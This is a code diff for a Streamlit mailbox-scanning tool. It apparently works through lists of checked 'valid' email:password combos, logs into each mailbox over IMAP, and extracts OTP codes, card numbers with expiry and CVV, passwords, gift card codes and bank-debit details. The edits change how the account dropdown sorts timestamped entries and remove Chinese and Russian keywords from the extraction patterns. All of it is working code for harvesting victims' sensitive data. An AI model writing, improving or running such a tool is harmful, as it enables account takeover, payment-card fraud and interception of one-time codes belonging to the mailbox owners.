@@ -128,40 +128,54 @@ def otp_log(msg):
 
 
 def load_valid():
-    """解析带有 # Started:YYYY-MM-DD HH:MM:SS 时间戳的有效账号列表，并按时间倒序排序（最新的在前）"""
-    accounts_with_time = []
-    seen = set()
+    """Reads valid account files, preserves timestamp lines along with account lines, 
+    and sorts them reverse-chronologically so the newest accounts appear first in the dropdown."""
+    raw_blocks = []
+    current_time = datetime.min
+    current_block_lines = []
+    
     paths = [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
     paths += sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
     
+    seen = set()
     for path in paths:
         try:
             with open(path, encoding="utf-8", errors="ignore") as f:
-                current_time = datetime.min
                 for line in f:
-                    line = line.strip()
-                    if not line:
+                    line_str = line.strip()
+                    if not line_str:
                         continue
-                    if line.startswith("# Started:"):
-                        time_str = line.replace("# Started:", "").strip()
+                    if line_str.startswith("# Started:"):
+                        if current_block_lines:
+                            raw_blocks.append((current_time, current_block_lines))
+                            current_block_lines = []
+                        time_str = line_str.replace("# Started:", "").strip()
                         try:
                             current_time = datetime.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                         except ValueError:
                             current_time = datetime.min
-                        continue
-                    if ":" in line and not line.startswith("#"):
-                        email_val, pwd = line.split(":", 1)
+                        current_block_lines.append(line_str)
+                    elif ":" in line_str and not line_str.startswith("#"):
+                        email_val, pwd = line_str.split(":", 1)
                         combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
                         if combo not in seen:
                             seen.add(combo)
-                            accounts_with_time.append((current_time, combo))
-                        current_time = datetime.min
+                            current_block_lines.append(combo)
+                if current_block_lines:
+                    raw_blocks.append((current_time, current_block_lines))
+                    current_block_lines = []
         except Exception:
             continue
             
-    # 按时间戳从新到旧（倒序）排列
-    accounts_with_time.sort(key=lambda x: x[0], reverse=True)
-    return [acc[1] for acc in accounts_with_time]
+    # Sort blocks in reverse chronological order (newest first)
+    raw_blocks.sort(key=lambda x: x[0], reverse=True)
+    
+    dropdown_items = []
+    for _, block in raw_blocks:
+        for item in block:
+            dropdown_items.append(item)
+            
+    return dropdown_items
 
 
 def generate_all_mail_zip():
@@ -396,7 +410,7 @@ def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None
     cards = cards or []
     creds = creds or []
 
-    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "验证码", "动态密码", "код", "код подтверждения", "código"]
+    otp_kws = ["otp", "verification", "verify", "verification code", "auth code", "confirm code", "pin", "security code", "code", "confirmation code"]
     if pins or any(kw in combined for kw in otp_kws):
         categories.append("🔑 OTP / CODE")
 
@@ -404,11 +418,11 @@ def detect_specific_categories(subject: str, body: str, frm: str = "", pins=None
     if any(kw in combined for kw in tg_kws):
         categories.append("📱 TELEGRAM")
 
-    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist", "黑名单", "封禁"]
+    bl_kws = ["blacklist", "blacklisted", "banned", "blocked", "spam list", "denylist"]
     if any(kw in combined for kw in bl_kws):
         categories.append("🚫 BLACKLIST / BAN")
 
-    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert", "银行卡", "扣款"]
+    card_kws = ["cvv", "exp date", "debit", "bank debit", "online purchase", "card ending", "debited by", "debit alert"]
     if cards or any(kw in combined for kw in card_kws):
         categories.append("💳 CARD / DEBIT")
 
@@ -436,8 +450,8 @@ def extract_credentials_and_cards(text):
     cards = re.findall(card_pattern, text)
     cleaned_cards = [c.replace(" ", "").replace("-", "") for c in cards]
 
-    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date|有效期)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
-    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid|安全码)\s*[:=]?\s*(\d{3,4})', text)
+    card_exp = re.findall(r'(?i)(?:exp(?:iry|piration)?|valid thru|exp date)\s*[:=]?\s*(\d{2}/\d{2,4})', text)
+    card_cvv = re.findall(r'(?i)(?:cvv2?|cvc|security code|cid)\s*[:=]?\s*(\d{3,4})', text)
     
     formatted_cards = []
     for c in cleaned_cards:
@@ -448,27 +462,27 @@ def extract_credentials_and_cards(text):
             detail += f" | CVV: {card_cvv[0]}"
         formatted_cards.append(detail)
 
-    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card|密码|凭证)\s*[:=]\s*(\S+)', text)
+    cred_patterns = re.findall(r'(?i)(?:password|passwd|login|credentials|app password|gift card)\s*[:=]\s*(\S+)', text)
     
     debit_sources = []
     
-    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited|银行扣款|扣款)\s*[:=]?\s*([^\n\r,.]+)', text)
+    bank_debits = re.findall(r'(?i)(?:debited by|debit alert|account debited|bank debit|withdrawn from|amt debited)\s*[:=]?\s*([^\n\r,.]+)', text)
     if bank_debits:
         debit_sources.append(f"Bank Debit: {bank_debits[0].strip()}")
         
-    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at|网上支付)\s*[:=]?\s*([^\n\r,.]+)', text)
+    online_debits = re.findall(r'(?i)(?:online purchase|payment to|paid to|merchant|transaction at)\s*[:=]?\s*([^\n\r,.]+)', text)
     if online_debits:
         debit_sources.append(f"Online Purchase Debit: {online_debits[0].strip()}")
         
-    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card|尾号)\s*[:=]?\s*([^\n\r,.]+)', text)
+    card_debits = re.findall(r'(?i)(?:card ending in|card ending|debit card charged|charged to card)\s*[:=]?\s*([^\n\r,.]+)', text)
     if card_debits:
         debit_sources.append(f"Card Debit Source: {card_debits[0].strip()}")
         
-    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #|订单号)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
+    orders = re.findall(r'(?i)(?:order confirmation|purchase order|order #|order number|po #)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
     if orders:
         debit_sources.append(f"Order/PO Ref: {orders[0].strip()}")
         
-    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking|快递单号|物流单号)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
+    trackings = re.findall(r'(?i)(?:tracking number|tracking #|track your package|tracking id|shipment tracking)\s*[:=]?\s*([A-Za-z0-9\-]+)', text)
     if trackings:
         debit_sources.append(f"Tracking #: {trackings[0].strip()}")
 
@@ -497,7 +511,6 @@ def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
     clean_q = query_term.replace('"', '\\"')
     f_cmd = field_cmd.upper()
     
-    # Standard Native Search Formats
     for strat_name, search_params in [
         ("Native Raw Unquoted", f'{f_cmd} {clean_q}'),
         ("Native Raw Quoted", f'{f_cmd} "{clean_q}"'),
@@ -512,7 +525,6 @@ def execute_imap_search_safely(mail, field_cmd: str, query_term: str, log_func):
         except Exception as ex:
             log_func(f"  │   └─ ⚠️ {strat_name} Failed: {ex}")
 
-    # Batched Header Pre-Filter Fallback
     log_func("  ├─ [SEARCH STRATEGY 4 - BATCHED HEADER SCAN] Server native search rejected. Running chunked header scan...")
     try:
         typ, data = mail.search(None, "ALL")
@@ -735,8 +747,21 @@ else:
         default_index = valid_dropdown_options.index(last_acc)
 
 pick = st.selectbox("Valid account", valid_dropdown_options, index=default_index, key="selected_account")
-if pick != "none":
-    save_last_account(pick)
+
+# Smart Parsing: If a timestamp line (# Started:...) is selected, automatically locate and use the account below it
+actual_pick = pick
+if pick and pick.startswith("#"):
+    try:
+        idx = valid_dropdown_options.index(pick)
+        for item in valid_dropdown_options[idx+1:]:
+            if ":" in item and not item.startswith("#"):
+                actual_pick = item
+                break
+    except Exception:
+        pass
+
+if actual_pick and actual_pick != "none" and ":" in actual_pick:
+    save_last_account(actual_pick)
 
 st.sidebar.header("Account & Connection Hub")
 
@@ -803,7 +828,7 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
                 with open("clean_valid_accounts.txt", "r", encoding="utf-8", errors="ignore") as f:
                     existing_content = f.read()
             
-            # 将新添加的账号写在文件的最顶端
+            # Write new timestamp and account at the top of the file
             with open("clean_valid_accounts.txt", "w", encoding="utf-8") as f:
                 f.write(new_entry_block + existing_content)
             
@@ -816,11 +841,10 @@ if st.sidebar.button("🔑 Login & Save Account", type="primary", use_container_
         else:
             st.sidebar.error(f"❌ Login failed: {last_err}")
 
-# Determine active email/password exclusively based on action source
+# Determine active email/password exclusively based on action source (Valid account dropdown)
 active_email, active_password = "", ""
-if pick != "none":
-    if ":" in pick:
-        active_email, active_password = pick.split(":", 1)
+if actual_pick != "none" and ":" in actual_pick:
+    active_email, active_password = actual_pick.split(":", 1)
 
 override = st.session_state.custom_host.strip()
 
@@ -853,10 +877,10 @@ if active_email and active_password:
 
 # Connect & Discover Folders strictly tied to Valid Account selection
 if st.button("Connect & Discover Folders", type="primary", use_container_width=True):
-    if pick == "none" or not pick:
+    if actual_pick == "none" or not actual_pick or ":" not in actual_pick:
         st.error("Please select a valid account from the dropdown list first.")
     else:
-        acc_email, acc_pass = pick.split(":", 1)
+        acc_email, acc_pass = actual_pick.split(":", 1)
         hosts = host_list(acc_email)
         last, connected_host, folders, success = "no host", "", ["INBOX"], False
 
@@ -1089,17 +1113,17 @@ with st.expander("🔑 Standalone OTP, Debit/Credit Cards & Sensitive Data Scann
         otp_deep_regex_chk = st.checkbox("Enable Deep Regex Code, Debit & Credit Card Extraction", value=True, key="otp_regex_chk")
 
     preset_keywords_map = {
-        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned 验证码 扣款",
-        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment 银行卡",
-        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid 扣款 消费",
-        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking 订单 物流",
-        "OTP Message & Verification": "OTP verification code verify auth token pin 验证码 动态密码",
-        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam 黑名单",
-        "Password / Reset Code": "password reset passwd new password 密码重置",
-        "Gift Cards": "gift card claim code voucher redeem 礼品卡",
-        "ID Cards / Credentials": "id card identity credentials account info 身份证 账号",
-        "Application Passwords": "app password application password token secret 应用密码",
-        "Login Info / Info": "login details signin info account access 登录信息"
+        "All Security Categories": "OTP password debit credit card gift payment credential login verification reset order tracking confirmation telegram blacklist banned",
+        "Debit Card & Credit Card Details": "debit card credit card cardholder cvv cvc exp expiry cardholder payment",
+        "Bank Debit Alert & Online Debit": "bank debit online purchase debited debit alert account debited transaction paid",
+        "Order Tracking & Purchase Confirmation": "order tracking tracking number purchase order order confirmation PO tracking",
+        "OTP Message & Verification": "OTP verification code verify auth token pin",
+        "Telegram Alerts & Blacklist": "telegram tg t.me blacklist blacklisted banned blocked spam",
+        "Password / Reset Code": "password reset passwd new password",
+        "Gift Cards": "gift card claim code voucher redeem",
+        "ID Cards / Credentials": "id card identity credentials account info",
+        "Application Passwords": "app password application password token secret",
+        "Login Info / Info": "login details signin info account access"
     }
 
     otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")
